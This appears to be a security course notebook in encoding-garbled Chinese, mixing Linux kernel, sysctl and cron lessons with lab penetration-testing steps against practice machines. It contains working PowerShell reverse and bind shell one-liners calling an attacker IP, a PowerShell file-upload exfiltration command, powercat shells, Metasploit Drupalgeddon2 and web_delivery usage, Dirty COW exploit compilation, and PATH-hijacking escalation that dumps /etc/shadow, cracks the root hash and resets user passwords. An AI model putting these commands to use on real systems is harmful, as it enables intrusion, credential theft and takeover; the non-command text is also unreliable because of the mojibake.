$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

Step03 åˆ›å»ºä¸Šä¼ ç›®å½•ï¼Œå¹¶æˆæƒ
ps -ef | grep apache2  
mkdir /var/www/uploads
chown www-data: /var/www/uploads

å‘½ä»¤  é€‰é¡¹   å‚æ•°

Step04 ä½¿ç”¨Powershellè„šæœ¬å®ç°ä¸Šä¼ çš„ç›®çš„äº†
 powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.195.76/upload.php', 'whoami.exe')

powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.195.76/upload.php', 'd:\startup.cfg')




http://192.168.195.76/upload.php'

### Day77
77.1 Uploading Files with TFTP
é€šè¿‡TFTPæœåŠ¡å®ç°æ–‡ä»¶çš„ä¸Šä¼ 
TFTP-ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼ŒåŸºäºUDPä¼ è¾“çš„ï¼Œç«¯å£æ˜¯69
è¿™æ˜¯ä¸€ä¸ªéå¸¸æ£’çš„éäº¤äº’å¼æ–‡ä»¶ä¼ è¾“å·¥å…·

Step01 Kaliä¸­æ¶è®¾TFTPæœåŠ¡å™¨
è½¯ä»¶åŒ…ï¼šatftpd æœåŠ¡ç«¯
		atftp  å®¢æˆ·ç«¯
æœåŠ¡è¿›ç¨‹ atftpd
å®‰è£…
 apt install atftp
 dpkg -l | grep atftp   //éªŒè¯
 dpkg -l  
  -l|--list  [<è¡¨è¾¾å¼> ...]        ç®€æ˜åœ°åˆ—å‡ºè½¯ä»¶åŒ…çš„çŠ¶æ€ã€‚
é…ç½®
   åˆ›å»ºä¸€ä¸ªtftpæ ¹ç›®å½•å¹¶æˆæƒ
		mkdir /tftp
		chown nobody: /tftp
   å¯åŠ¨
		atftpd --daemon --port 69 /tftp
		--daemon ä»¥ç‹¬ç«‹æœåŠ¡è¿›ç¨‹çš„æ–¹å¼å¯åŠ¨
å®¢æˆ·ç«¯
	tftp -i 192.168.195.76 put wget.exe
	
77.2 PowerShell Reverse Shells
 ä½¿ç”¨Powershellåˆ›å»ºåå‘shell
 
 åŸå› ï¼šç”±äºPowerShellåœ¨å¤§å¤šæ•°ç°ä»£Windowsæœºå™¨ä¸Šéƒ½æ˜¯åŸç”Ÿçš„
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.195.76',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 77.3. PowerShell Bind Shells
 ä½¿ç”¨Powershellåˆ›å»ºæ­£å‘shell
 powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',4444);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

77.4. Powercat
Powercatæœ¬è´¨ä¸Šæ˜¯netcatçš„Powershellç‰ˆæœ¬

Netcat: The powershell version
åŠŸèƒ½ï¼š
1.æ–‡ä»¶ä¼ è¾“
2.æ­£å‘shellå’Œåå‘shell
3.å»ºç«‹éš§é“
4.DNSéš§é“
5.ä»¥ä¸€ä¸ªç‹¬ç«‹çš„Payloadçš„æ–¹å¼è¿è¡Œï¼Œä¸”æ”¯æŒå¯¹Payloadç¼–ç 
 
 
 Kaliä¸­å®‰è£…Powercat
 apt install powercat
 è„šæœ¬ä½ç½® 
 /usr/share/windows-resources/powercat
 
 è„šæœ¬çš„è¿è¡Œ
 æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ä¸€ä¸ªç§°ä¸ºDot-sourcingçš„PowerShellç‰¹æ€§æ¥åŠ è½½powercat.ps1è„šæœ¬,è¿™å°†ä½¿æ‰€æœ‰çš„å˜é‡å’Œå‡½æ•°å£°æ˜åœ¨è„šæœ¬ä¸­å¯ç”¨ï¼Œåœ¨å½“å‰çš„PowerShellèŒƒå›´ä¸­
 
 Dot-sourcingçš„PowerShellç‰¹æ€§
 ï¼ˆå½“æ‚¨. .\è„šæœ¬åç§°æ—¶ï¼Œè„šæœ¬(æˆ–è„šæœ¬å—)ä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°å°†åœ¨è„šæœ¬ç»“æŸæ—¶ä¿å­˜åœ¨å½“å‰shellä¸­ã€‚ï¼‰
 é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨PowerShellä¸­ç›´æ¥ä½¿ç”¨Powercatè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ‰§è¡Œè„šæœ¬
 
 ï¼ˆ1ï¼‰åå‘shell
 Kali  ï¼ˆ192.168.195.76ï¼‰  
	nc -lnvp 443 
 Windowsä¸»æœº
 powercat -c  192.168.195.76 -p 443 -e cmd.exe 
  -c  å®¢æˆ·ç«¯æ¨¡å¼
 ï¼ˆ2ï¼‰æ­£å‘shell
 -l   ç›‘å¬æ¨¡å¼ï¼ˆæœåŠ¡ç«¯ï¼‰
 powercat -l -p 12306 -e cmd.exe
 
 Kali 
	nc -nv 192.168.195.90 12306
ä¿¡æ¯å®‰å…¨1902/1903
ä½œä¸š1ï¼š
ä¿¡æ¯å®‰å…¨1901

 
 
 
 
 










### Day78
### *78å¤©
Chapter15 ç®¡ç†LINUXå†…æ ¸å’Œå¯åŠ è½½å†…æ ¸æ¨¡å—

1. ä»€ä¹ˆæ˜¯å†…æ ¸ï¼ˆkernelï¼‰ï¼Ÿ
æ“ä½œç³»ç»Ÿçš„ç»„æˆ=å†…æ ¸ç©ºé—´+ç”¨æˆ·ç©ºé—´

2. æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬
uname -r
uname -a

cat /proc/version

3. æŸ¥çœ‹å†…æ ¸æ–‡ä»¶

ls /boot/vmlinuz-`uname -r`*
ls /boot/vmlinuz-$(uname -r)*

4. ç³»ç»Ÿçš„åŸºæœ¬å¯åŠ¨æµç¨‹
BIOSï¼ˆå¼€æœºè‡ªæ£€ï¼‰-è¯»å–MBRå†…çš„æ“ä½œç³»ç»Ÿå¼•å¯¼ç¨‹åºï¼ˆGRUBï¼‰-åŠ è½½ç³»ç»Ÿå†…æ ¸åˆ°å†…å­˜---å¯åŠ¨ç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªæœåŠ¡systemdï¼ˆå‰èº«ä¸ºinitï¼‰---ç”±systemdåŠ è½½ç³»ç»Ÿçš„å…¶ä»–æœåŠ¡

5. å†…æ ¸æ¨¡å—
ç°åœ¨çš„Linuxå†…æ ¸æ˜¯åŸºäºæ¨¡å—åŒ–è®¾è®¡çš„ï¼Œå¯ä»¥é€šè¿‡å†…æ ¸æ¨¡å—å®ç°åŠŸèƒ½çš„æ‰©å±•å’Œè¯†åˆ«ä¸€äº›æ–°çš„ç¡¬ä»¶ï¼Œè€Œä¸éœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸ã€‚
æˆ‘ä»¬æŠŠè¿™ç§æ¨¡å—ç§°ä¸ºLKMï¼ˆå¯åŠ è½½å†…æ ¸æ¨¡å—ï¼‰
Load Kernel Module

ä¸€ç§ç§°ä¸º rootkit çš„ç‰¹æ®Šç±»å‹çš„æ¶æ„è½¯ä»¶é€šå¸¸é€šè¿‡è¿™äº› LKM åµŒå…¥åˆ°æ“ä½œç³»ç»Ÿçš„å†…æ ¸ä¸­ã€‚å¦‚æœæ¶æ„è½¯ä»¶åµŒå…¥å†…æ ¸ï¼Œ é»‘å®¢å°±å¯ä»¥å®Œå…¨æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚

6. å†…æ ¸ä¼˜åŒ–*****
ç›®çš„ï¼š
	æå‡æ€§èƒ½
	æ‰©å±•åŠŸèƒ½
	ç³»ç»Ÿçš„åŠ å›ºã€å®‰å…¨é˜²èŒƒ
å·¥å…·ï¼šsysctl
é…ç½®æ–‡ä»¶ï¼š/etc/sysctl.conf 
æŸ¥çœ‹å¸®åŠ© man sysctl.conf

-p, --load[=<file>]  read values from file
è¯»å–æ–‡ä»¶ä¸­çš„å‚æ•°å€¼ï¼Œä½¿æ–‡ä»¶ä¸­çš„å‚æ•°ä¿®æ”¹ç”Ÿæ•ˆ
-a æ˜¾ç¤ºæ‰€æœ‰å†…æ ¸å‚æ•°å€¼ï¼ˆç”Ÿæ•ˆï¼‰

-w  ä¸´æ—¶æ›´æ”¹å†…å†…æ ¸å‚æ•°çš„å€¼ 
sysctl -w net.ipv4.ip_forward=1 

[æ¡ˆä¾‹1]ç¦æ­¢å…¶ä»–ä¸»æœºping
å¿½ç•¥å…¶ä»–ä¸»æœºçš„echoè¯·æ±‚
/proc/sys/net/ipv4/icmp_echo_ignore_all

net.ipv4.icmp_echo_ignore_all = 1

[æ¡ˆä¾‹2]æ‰“å¼€IPè½¬å‘åŠŸèƒ½ï¼ˆå®æ–½ä¸­é—´äººæ”»å‡»ï¼ŒåŠ«æŒæµé‡ï¼‰

åœºæ™¯ï¼šå®æ–½ä¸­é—´äººæ”»å‡»ï¼ŒåŠ«æŒæµé‡ï¼ˆæ”»å‡»ç°è±¡å¦‚ARPæ¬ºéª—ï¼‰

å†…æ ¸çš„ä¼˜åŒ–
net.ipv4.tcp_fin_timeout = 2
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_syncookies = 1  //æŠµå¾¡SYN Floodèƒ½åŠ›
net.ipv4.tcp_keepalive_time =600
net.ipv4.ip_local_port_range = 32768   60999
net.ipv4.tcp_max_syn_backlog = 8182
net.core.somaxconn = 1024
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_syn_retries = 1
net.ipv4.tcp_synack_retries = 1
net.ipv4.tcp_max_orphans = 2000




ä¿¡æ¯å®‰å…¨1902 ç‹æ—­é˜³(2080057087)  11:43:41
å†…æ ¸çš„ä¼˜åŒ–
net.ipv4.tcp_fin_timeout = 2 //ä¿®æ”¹ç³»é»˜è®¤çš„ TIMEOUT æ—¶é—´
net.ipv4.tcp_tw_reuse = 1	 //è¡¨ç¤ºå¼€å¯é‡ç”¨ã€‚å…è®¸å°†TIME-WAIT socketsé‡æ–°ç”¨äºæ–°çš„TCPè¿æ¥ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ï¼›
net.ipv4.tcp_tw_recycle = 0  //è¡¨ç¤ºå¼€å¯TCPè¿æ¥ä¸­TIME-WAIT socketsçš„å¿«é€Ÿå›æ”¶ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ã€‚
net.ipv4.tcp_syncookies = 1  //æŠµå¾¡SYN Floodèƒ½åŠ›  è¡¨ç¤ºå¼€å¯SYN Cookiesã€‚å½“å‡ºç°SYNç­‰å¾…é˜Ÿåˆ—æº¢å‡ºæ—¶ï¼Œå¯ç”¨cookiesæ¥å¤„ç†ï¼Œå¯é˜²èŒƒå°‘é‡SYNæ”»å‡»ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­ï¼›
net.ipv4.tcp_keepalive_time =600	//è¡¨ç¤ºå½“keepaliveèµ·ç”¨çš„æ—¶å€™ï¼ŒTCPå‘é€keepaliveæ¶ˆæ¯çš„é¢‘åº¦ã€‚ç¼ºçœæ˜¯2å°æ—¶ï¼Œæ”¹ä¸º20åˆ†é’Ÿã€‚
net.ipv4.ip_local_port_range = 32768   60999 //è¡¨ç¤ºç”¨äºå‘å¤–è¿æ¥çš„ç«¯å£èŒƒå›´ã€‚ç¼ºçœæƒ…å†µä¸‹å¾ˆå°ï¼š32768åˆ°61000ï¼Œæ”¹ä¸º1024åˆ°65000ã€‚
net.ipv4.tcp_max_syn_backlog = 8182	//è¡¨ç¤ºSYNé˜Ÿåˆ—çš„é•¿åº¦ï¼Œé»˜è®¤ä¸º1024ï¼ŒåŠ å¤§é˜Ÿåˆ—é•¿åº¦ä¸º8192ï¼Œå¯ä»¥å®¹çº³æ›´å¤šç­‰å¾…è¿æ¥çš„ç½‘ç»œè¿æ¥æ•°ã€‚
net.core.somaxconn = 1024	//è¯¥å‚æ•°ç”¨äºè°ƒèŠ‚ç³»ç»ŸåŒæ—¶å‘èµ·çš„TCPè¿æ¥æ•°ï¼Œä¸€èˆ¬é»˜è®¤å€¼ä¸º128.åœ¨å®¢æˆ·ç«¯å­˜åœ¨é«˜å¹¶å‘è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œè¯¥é»˜è®¤å€¼è¾ƒå°å¯èƒ½å¯¼è‡´é“¾æ¥è¶…æ—¶æˆ–è€…é‡ä¼ é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å®é™…éœ€è¦ç»“åˆå¹¶éè¯·æ±‚æ¥è°ƒæ•´è¯¥å€¼ã€‚
net.ipv4.tcp_max_tw_buckets = 5000	//è¡¨ç¤ºç³»ç»ŸåŒæ—¶ä¿æŒTIME_WAITå¥—æ¥å­—çš„æœ€å¤§æ•°é‡ï¼Œå¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼ŒTIME_WAITå¥—æ¥å­—å°†ç«‹åˆ»è¢«æ¸…é™¤å¹¶æ‰“å°è­¦å‘Šä¿¡æ¯ã€‚
net.ipv4.tcp_syn_retries = 1	//è¡¨ç¤ºåº”ç”¨ç¨‹åºè¿›è¡Œconnect()ç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œåœ¨å¯¹æ–¹ä¸è¿”å›SYN + ACKçš„æƒ…å†µä¸‹(ä¹Ÿå°±æ˜¯è¶…æ—¶çš„æƒ…å†µä¸‹)ï¼Œç¬¬ä¸€æ¬¡å‘é€ä¹‹åï¼Œå†…æ ¸æœ€å¤šé‡è¯•å‡ æ¬¡å‘é€SYNåŒ…;å¹¶ä¸”å†³å®šäº†ç­‰å¾…æ—¶é—´.
net.ipv4.tcp_synack_retries = 1	//è¯¥å‚æ•°ç”¨äºè®¾ç½®å†…æ ¸æ”¾å¼ƒTCP é“¾æ¥ä¹‹å‰å‘å®¢æˆ·ç«¯å‘é€SYN+ACK åŒ…çš„æ•°é‡ã€‚ä¸ºäº†ç®€å†å¯¹ç«¯çš„é“¾æ¥æœåŠ¡ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éœ€è¦è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œç¬¬äºŒæ¬¡æ¡æ‰‹æœŸé—´ï¼Œå†…æ ¸éœ€è¦å‘é€SYN å¹¶é™„å¸¦ä¸€ä¸ªå›åº”å‰ä¸€ä¸ªSYN çš„ACKï¼Œè¿™ä¸ªå‚æ•°ä¸»è¦å½±å“è¿™ä¸ªè¿‡ç¨‹ï¼Œä¸€èˆ¬èµ‹å€¼ä¸º1ï¼Œå³å†…æ ¸æ”¾å¼ƒé“¾æ¥ä¹‹å‰å‘é€ä¸€æ¬¡SYN+ACKåŒ…
net.ipv4.tcp_max_orphans = 2000	//è¯¥å‚æ•°ç”¨äºè®¾å®šç³»ç»Ÿä¸­æœ€å¤šå…è®¸åœ¨å¤šå°‘TCPå¥—æ¥å­—ä¸è¢«å…³è”åˆ°ä»»ä½•ä¸€ä¸ªç”¨æˆ·æ–‡ä»¶å¥æŸ„ä¸Šã€‚å¦‚æœè¶…è¿‡è¿™ä¸ªæ•°å­—ï¼Œæ²¡æœ‰ä¸ç”¨æˆ·æ–‡ä»¶å¥æŸ„å…³è”çš„TCP å¥—æ¥å­—å°†ç«‹å³è¢«å¤ä½ï¼ŒåŒæ—¶ç»™å‡ºè­¦å‘Šä¿¡æ¯ã€‚è¿™ä¸ªé™åˆ¶åªæ˜¯ä¸ºäº†é˜²æ­¢ç®€å•ç‚¹çš„Dos æ”»å‡»ã€‚ä¸€èˆ¬åœ¨ç³»ç»Ÿå†…å­˜æ¯”è¾ƒå……è¶³çš„æƒ…å†µä¸‹å¯ä»¥å¢å¤§è¿™ä¸ªå‚æ•°
### *79å¤©
79.1 ç®¡ç†Linuxå†…æ ¸æ¨¡å—
å†…æ ¸æ–‡ä»¶ä¸€èˆ¬éƒ½æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œåœ¨åŠ è½½åˆ°å†…å­˜ä¹‹å‰éœ€è¦è¿›è¡Œè§£å‹ç¼©ã€‚
æ ¸å¿ƒè§£å‹æ—¶éœ€è¦ä¸€ä¸ªå†…å­˜ç£ç›˜ï¼ˆRAM DISKï¼‰
æ–‡ä»¶åï¼š/boot/initramfs-å†…æ ¸ç‰ˆæœ¬æˆ–
		/boot/initrd.img--å†…æ ¸ç‰ˆæœ¬
ï¼ˆ1ï¼‰æ¨¡å—æ–‡ä»¶å­˜æ”¾ä½ç½®
		/lib/modules/`uname -r`/kernel
ï¼ˆ2ï¼‰æ¨¡å—ä¹‹é—´æœ‰ç›¸äº’çš„ä¾èµ–æ€§

ï¼ˆ3ï¼‰æ¨¡å—æ–‡ä»¶çš„æ‰©å±•å*.ko

ï¼ˆ4ï¼‰å†…æ ¸æ¨¡å—çš„ç®¡ç†
		æ–¹æ³•1ï¼šinsmodå·¥å…·é›†ï¼ˆè€çš„æ–¹æ³•ï¼‰
		æ–¹æ³•2ï¼š modprobe ï¼ˆæ¨èï¼‰
		
ï¼ˆ5ï¼‰lsmod åˆ—å‡ºæ ¸å¿ƒåŠ è½½çš„æ¨¡å—
ï¼ˆ6ï¼‰modinfo åˆ—å‡ºæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯

ï¼ˆ7ï¼‰æ¨¡å—çš„åŠ è½½å’Œåˆ é™¤
åŠ è½½ä¸€ä¸ªæ¨¡å—
insmod /lib/modules/`uname -r`/kernel/fs/fat/fat.ko
åˆ é™¤æ¨¡å—
rmmod

modprobe è‡ªåŠ¨è§£å†³æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»
æ¡ˆä¾‹ï¼šCIFS
modprobe cifs
modprobe -r cifs

dmesg  //æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†çš„ç¡¬ä»¶ä¿¡æ¯

uname -r
lsmod 
modprobe -a
sysctl -w net.ipv4.ip_forward=1 

è…¾è®¯å“ˆå‹ƒåˆ†æç³»ç»Ÿ (qq.com) 
æ‚Ÿç©ºæ‰«æå™¨ https://github.com/Lee-0x00/wukong-agent

### *80å¤©
 Lampiaoé¶æœºå®æˆ˜
 
 1ã€ä¿¡æ¯æ¢æµ‹
 
 nmap -p- -A 192.168.195.154
-p-  ç­‰åŒäº -p 1-65535
-A   ç§¯æçš„ç»¼åˆçš„æ‰«æ 

2. HTTPæ¢æµ‹
Burp Suite

ç»å¸¸åœ¨åº”ç”¨ç¨‹åºæ‰€åœ¨æœåŠ¡å™¨çš„å“åº”æ ‡å¤´ä¸­æŠ«éœ²CMSçš„ç‰ˆæœ¬

 Drupal 7
 
3. æ¼æ´åˆ©ç”¨


	CVE-2018-7600

åœ¨MSF
search drupal
use explot/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.195.176
set rport 1898
exploit


è¿›å…¥äº¤äº’å¼shell
python -c 'import pty;pty.spawn("/bin/bash")'



ææƒ

### *81å¤©
åˆ©ç”¨Linuxå†…æ ¸æ¼æ´è¿›è¡Œææƒ
ï¼ˆ1ï¼‰ä¿¡æ¯æ”¶é›†ï¼Œä¾‹å¦‚æŸ¥çœ‹å½“å‰æƒé™ã€æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬å’Œå†…æ ¸ç‰ˆæœ¬ç­‰ã€‚

ï¼ˆ2ï¼‰æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯æŸ¥æ‰¾EXPã€‚

ï¼ˆ3ï¼‰ä½¿ç”¨EXPææƒã€‚


export PATH=.:$PATH

æŸ¥æ‰¾UIDä¸º0çš„ç”¨æˆ·
awk -F : '($3==0){print $1}' /etc/passwd
æŸ¥æ‰¾SUIDä½çš„æ–‡ä»¶
find / -user root -perm -4000 -exec ls -ldb {}  2>/dev/null  \;

www-data@lampiao:/var/www/html$ uname -a
uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
www-data@lampiao:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:        14.04
Codename:       trusty

https://github.com/SecWiki/linux-kernel-exploits

searchsploit dirty 
40847.cpp
searchsploit -m 40847.cpp
-m  æŠŠæ‰¾åˆ°çš„expé•œåƒï¼ˆå¤åˆ¶ï¼‰ä¸€ä»½åˆ°å½“å‰ç›®å½•
wget http://192.168.195.171:9000/40847.cpp
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ./dcow -s 
 https://www.exploit-db.com/exploits/40847


https://blog.51cto.com/wangenzhi/1674996

### *82å¤©

Chapter ä½¿ç”¨ä½œä¸šè°ƒåº¦å®ç°è‡ªåŠ¨åŒ–ä»»åŠ¡

è®¡åˆ’ä»»åŠ¡

at   ä¸€æ¬¡æ€§
cron æœåŠ¡ å‘¨æœŸæ€§
crontab ç®¡ç†cronæœåŠ¡çš„å·¥å…·
-u  æŒ‡å®šçš„ç”¨æˆ·
-e  ç¼–è¾‘
-l  åˆ—å‡º
-r  åˆ é™¤
/etc/crontab ç³»ç»Ÿçš„ä»»åŠ¡è®¡åˆ’æ–‡ä»¶
ä¹Ÿå¯ä»¥ä¸ºæ¯ä¸ªç”¨æˆ·ç¼–è¾‘ä»»åŠ¡è®¡åˆ’æ–‡ä»¶
mkdir /tmp/test

[æ¡ˆä¾‹]è®¾ç½®ä¸€ä¸ªå¤‡ä»½è®¡åˆ’ä»»åŠ¡

Crontabçš„å¿«æ·æ–¹å¼
crontab æ–‡ä»¶æœ‰äº›å†…ç½®çš„å¿«æ·æ–¹å¼ï¼Œç”¨æ¥ä»£æ›¿å…·ä½“çš„æ—¶é—´ï¼Œæ—¥æœŸï¼Œæœˆä»½
@reboot æ¯æ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶


rc.dè„šæœ¬
update-rc.d æœåŠ¡åç§°  enable  è®¾ç½®æœåŠ¡å¼€æœºå¯åŠ¨
update-rc.d æœåŠ¡åç§°  disable  è®¾ç½®æœåŠ¡å¼€æœºä¸å¯åŠ¨
update-rc.d postgresql enable
éªŒè¯ï¼šé‡å¯å
ps aux | grep postgresql
netstat -tnlp 

ä¹Ÿå¯ä»¥é€šè¿‡rcconfè¿™ä¸ªå›¾å½¢åŒ–å·¥å…·ç®¡ç†æœåŠ¡çš„å¼€æœºå¯åŠ¨
apt-get install rcconf


### *83-90å¤©
ç½‘ç»œæ”»é˜²å®æˆ˜
é¶æœºå®æˆ˜å››ï¼šEscalate_Linux
1ã€ä¿¡æ¯æ”¶é›†
æ‰«æ

nmap -A -p- -o escalate.nmap 192.168.195.175

2ã€HTTPæ¢æµ‹
dirb http://192.168.195.175 -X .php  

3ã€å‘ç°Webç«™ç‚¹å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„æ¼æ´  

http://192.168.195.175/shell.php?cmd=id

æƒ³ä¸€æƒ³æˆ‘è¿˜èƒ½åšä»€ä¹ˆï¼Ÿ

4ã€MSFä¸­web_deliveryæ¨¡å—ï¼ˆå®ç°Webshellçš„è¿œç¨‹æŠ•é€’ï¼‰

This module quickly fires up a web server that serves a payload. The 
  module will provide a command to be run on the target machine based 
  on the selected target. The provided command will download and 
  execute a payload using either a specified scripting language 
  interpreter or "squiblydoo" via regsvr32.exe for bypassing 
  application whitelisting. The main purpose of this module is to 
  quickly establish a session on a target machine when the attacker 
  has to manually type in the command: e.g. Command Injection, RDP 
  Session, Local Access or maybe Remote Command Execution. This attack 
  vector does not write to disk so it is less likely to trigger AV 
  solutions and will allow privilege escalations supplied by 
  Meterpreter. When using either of the PSH targets, ensure the 
  payload architecture matches the target computer or use SYSWOW64 
  powershell.exe to execute x86 payloads on x64 machines. Regsvr32 
  uses "squiblydoo" technique to bypass application whitelisting. The 
  signed Microsoft binary file, Regsvr32, is able to request an .sct 
  file and then execute the included PowerShell command inside of it. 
  Similarly, the pubprn target uses the pubprn.vbs script to request 
  and execute a .sct file. Both web requests (i.e., the .sct file and 
  PowerShell download/execute) can occur on the same port. The 
  SyncAppvPublishingServer target uses SyncAppvPublishingServer.exe 
  Microsoft signed binary to request and execute a PowerShell script. 
  This technique only works on Windows 10 builds <= 1709. "PSH 
  (Binary)" will write a file to the disk, allowing for custom 
  binaries to be served up to be downloaded and executed.


use exploit/multi/script/web_delivery
set SRVHOST 192.168.195.171ï¼ˆæ”»å‡»ç«¯çš„åœ°å€ï¼‰
set LHOST 192.168.195.171ï¼ˆæ”»å‡»ç«¯çš„åœ°å€ï¼‰
exploit

use exploit/multi/script/web_delivery
set SRVHOST 192.168.195.13
set LHOST 192.168.195.13
exploit

python -c 'import pty;pty.spawn("/bin/bash")'


5. ææƒç»ƒä¹ 

ä¿¡æ¯æ”¶é›†
wget http://192.168.195.171:9000/LinEnum.sh 


Method1ï¼š 

find / -user root -perm  -4000 -type f 2>/dev/null -exec ls -l {} \;

-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user5/script
-rwsr-xr-x 1 root root 8392 Jun  4  2019 /home/user3/shell
cd /home/user3/shell 
file shell  //æŸ¥çœ‹æ–‡ä»¶ç±»å‹
./shell 

Method2 ç¯å¢ƒå˜é‡åŠ«æŒææƒ
åœ¨æ‰§è¡Œ /home/user5/script è°ƒç”¨çš„æ˜¯ç³»ç»Ÿçš„lså‘½ä»¤

echo "/bin/bash" >/tmp/ls 
chmod 755 /tmp/ls 
export PATH=/tmp:$PATH  
PSï¼šexportæŠŠå˜é‡è¾“å‡ºä¸ºå…¨å±€ç¯å¢ƒå˜é‡

åœ¨Shellè¾“å…¥å‘½ä»¤æ—¶ï¼ŒShellä¼šæŒ‰PATHç¯å¢ƒå˜é‡ä¸­çš„è·¯å¾„ä¾æ¬¡æœç´¢å‘½ä»¤ï¼Œè‹¥æ˜¯å­˜åœ¨åŒåçš„å‘½ä»¤ï¼Œåˆ™æ‰§è¡Œæœ€å…ˆæ‰¾åˆ°çš„ï¼Œè‹¥æ˜¯PATHä¸­åŠ å…¥äº†å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯â€œ.â€è¿™ä¸ªç¬¦å·ï¼Œåˆ™å¯èƒ½ä¼šè¢«é»‘å®¢åˆ©ç”¨



Method3: Get a root shell by cracking the root password
é€šè¿‡è¯»å–å¯†ç æ–‡ä»¶/etc/shadowæ¥ç ´è§£rootç”¨æˆ·çš„å£ä»¤

echo "cat /etc/shadow" >/tmp/ls 
chmod 755 /tmp/ls 
export PATH=/tmp:$PATH 
/home/user5/script

root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::

echo 'root:$6$mqjgcFoM$X/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1'>hash.txt 

hashå¯†ç çš„ç ´è§£å·¥å…·
hashcat
john

john hash.txt  


Method 4: Get root shell by exploiting SUDO rights of user1
åˆ©ç”¨ç”¨æˆ·çš„sudoæˆæƒè·å¾—rootçš„shell

/etc/sudoers  sudoææƒçš„é…ç½®æ–‡ä»¶
echo 'cat /etc/sudoers' >/tmp/ls

root    ALL=(ALL:ALL) ALL
user1   ALL=(ALL:ALL) ALL 
//user1å¯ä»¥ä»¥æ‰€æœ‰ç”¨æˆ·èº«ä»½æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ï¼Œuser1å…¶å®å°±æ˜¯ä¸€ä¸ªç®¡ç†å‘˜
user2   ALL=(user1) ALL
user8   ALL=(root) NOPASSWD: /usr/bin/vi
æƒ³åŠæ³•æ›´æ”¹User1çš„å£ä»¤ï¼Ÿ
echo 'echo "user1:xiaoxiao" | chpasswd' >/tmp/ls
/home/user5/script

su - user1
sudo su -




wget http://192.168.195.122:8086/CVE-2021-4034-main.zip


Method5:Get root shell by exploiting crontab
åˆ©ç”¨ä»»åŠ¡è®¡åˆ’ææƒ
cat /etc/crontab

*/5  *    * * * root    /home/user4/Desktop/autoscript.sh

æ€è·¯ï¼šè¿™ä¸ªè„šæœ¬ä»¥rootèº«ä»½æ¯éš”5åˆ†é’Ÿè¿è¡Œä¸€æ¬¡
ä¿®æ”¹è¿™ä¸ªè„šæœ¬ï¼Œä»¥user4çš„èº«ä»½å»æ›´æ”¹
ä¿®æ”¹user4çš„å¯†ç 

echo 'echo "user4:xiaoxiao" | chpasswd ' >/tmp/ls
chmod +x /tmp/ls  
export PATH=/tmp:$PATH
/home/user5/script

è„šæœ¬ä¸­å†™ä»€ä¹ˆå‘¢ï¼Ÿ
æ–¹æ³•1
